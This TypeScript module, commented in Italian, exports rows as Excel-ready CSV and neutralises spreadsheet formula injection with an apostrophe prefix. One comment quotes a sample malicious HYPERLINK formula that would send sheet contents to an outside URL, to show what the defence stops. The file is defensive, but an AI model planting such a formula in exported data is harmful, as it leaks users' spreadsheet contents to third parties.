export type CsvColumn<TRow> = {
    header: string;
    value: (row: TRow) => string | number | boolean | Date | null | undefined;
    /**
     * Il valore è un codice o un numero di telefono, non una quantità: Excel deve leggerlo come
     * testo. Vedi `toTextCell`.
     */
    asText?: boolean;
};

export type CsvOptions = {
    /**
     * Il fuso in cui scrivere le date-ora (`Date`). Senza, restano l'istante in UTC in formato
     * ISO. Con il fuso del laboratorio escono come `2026-09-22 00:30`, che Excel legge come data.
     */
    timeZone?: string;
};

/**
 * Punto e virgola, non la virgola dello standard: il file lo apre Excel con un doppio clic, e
 * Excel divide le colonne con il "separatore di elenco" delle impostazioni internazionali di
 * Windows, che in italiano è `;` (la virgola lì separa i decimali). Con la virgola ogni riga
 * finiva intera nella colonna A. LibreOffice e Google Fogli il separatore lo chiedono o lo
 * riconoscono all'importazione, quindi non ci perdono.
 */
const separator = ";";

// RFC 4180: un campo va tra virgolette solo se contiene il separatore, virgolette o un
// a-capo, e le virgolette al suo interno si raddoppiano. Tutto il resto esce così com'è.
const escapeCsvField = (raw: string): string => (/[";\r\n]/.test(raw) ? `"${raw.replace(/"/g, '""')}"` : raw);

/**
 * Excel e LibreOffice trattano come formula ogni cella che comincia con `=`, `+`, `-` o `@`
 * (e con tab o a-capo, che alcune versioni scartano prima di guardare il primo carattere), e
 * le virgolette RFC 4180 non lo impediscono: vengono tolte prima della valutazione. I testi
 * esportati li scrive chiunque abbia un account (note, nomi, descrizioni), mentre il file lo
 * apre di solito l'amministratore: una nota come `=HYPERLINK("https://…?d="&B2;"apri")`
 * spediva altrove il contenuto del foglio. Anche senza cattive intenzioni un telefono scritto
 * `+39 333 …` diventava una formula sbagliata al posto del numero.
 *
 * L'apostrofo davanti è la difesa raccomandata da OWASP: il foglio mostra il testo così
 * com'è, apostrofo compreso. Un numero scritto come testo (i prezzi `numeric` arrivano da
 * Postgres come stringhe, anche negativi) non è una formula e resta intatto, altrimenti
 * `-5.00` non sarebbe più sommabile.
 */
const formulaTriggerPattern = /^[=+\-@\t\r]/;
const plainNumberPattern = /^[+-]?\d+(?:\.\d+)?$/;

const neutralizeFormula = (text: string): string =>
    formulaTriggerPattern.test(text) && !plainNumberPattern.test(text) ? `'${text}` : text;

/**
 * Un telefono `0612345678` in una cella CSV diventa per Excel il numero 612345678 (lo zero
 * sparisce) e con la colonna stretta un cellulare si legge `3,33E+09`. Il CSV non ha un modo per
 * dire "questo è testo": l'unico che Excel, LibreOffice e Fogli Google rispettano tutti è la
 * formula costante `="0612345678"`, che vale il testo scritto tra le virgolette.
 *
 * È una formula, quindi vale solo per ciò che non può contenere altro: cifre, spazi, `+`, `-`,
 * parentesi e punti, mai virgolette né `=` interni. Tutto il resto passa dalla difesa
 * ordinaria di `neutralizeFormula`, che una formula vera la disarma.
 */
const phoneLikePattern = /^[\d\s+().-]+$/;

const toTextCell = (text: string): string => (phoneLikePattern.test(text) ? `="${text}"` : neutralizeFormula(text));

const dateTimeFormatters = new Map<string, Intl.DateTimeFormat>();

/** `2026-09-22 00:30` nel fuso dato: la data e l'ora che vede chi lavora nel laboratorio. */
const formatLocalDateTime = (value: Date, timeZone: string): string => {
    let formatter = dateTimeFormatters.get(timeZone);

    if (!formatter) {
        formatter = new Intl.DateTimeFormat("en-CA", {
            timeZone,
            year: "numeric",
            month: "2-digit",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            hourCycle: "h23",
        });
        dateTimeFormatters.set(timeZone, formatter);
    }

    const parts = Object.fromEntries(formatter.formatToParts(value).map((part) => [part.type, part.value]));

    return `${parts.year}-${parts.month}-${parts.day} ${parts.hour}:${parts.minute}`;
};

const toCsvText = (
    value: string | number | boolean | Date | null | undefined,
    { asText, timeZone }: { asText?: boolean; timeZone?: string }
): string => {
    if (value == null) {
        return "";
    }

    if (value instanceof Date) {
        return timeZone ? formatLocalDateTime(value, timeZone) : value.toISOString();
    }

    if (typeof value === "boolean") {
        return value ? "Sì" : "No";
    }

    if (typeof value === "string") {
        return asText ? toTextCell(value) : neutralizeFormula(value);
    }

    return String(value);
};

/**
 * Il BOM UTF-8 in testa: senza, Excel su Windows (il caso d'uso qui, un laboratorio con
 * dati in italiano) apre il file assumendo la codifica del sistema e mostra gli accenti
 * come sequenze illeggibili. `\r\n` per lo stesso motivo, è quello che Excel si aspetta.
 */
const byteOrderMark = String.fromCharCode(0xfeff);

export const toCsv = <TRow>(rows: TRow[], columns: CsvColumn<TRow>[], options: CsvOptions = {}): string => {
    const lines = [
        columns.map((column) => escapeCsvField(column.header)),
        ...rows.map((row) =>
            columns.map((column) =>
                escapeCsvField(toCsvText(column.value(row), { asText: column.asText, timeZone: options.timeZone }))
            )
        ),
    ];

    return `${byteOrderMark}${lines.map((line) => line.join(separator)).join("\r\n")}\r\n`;
};
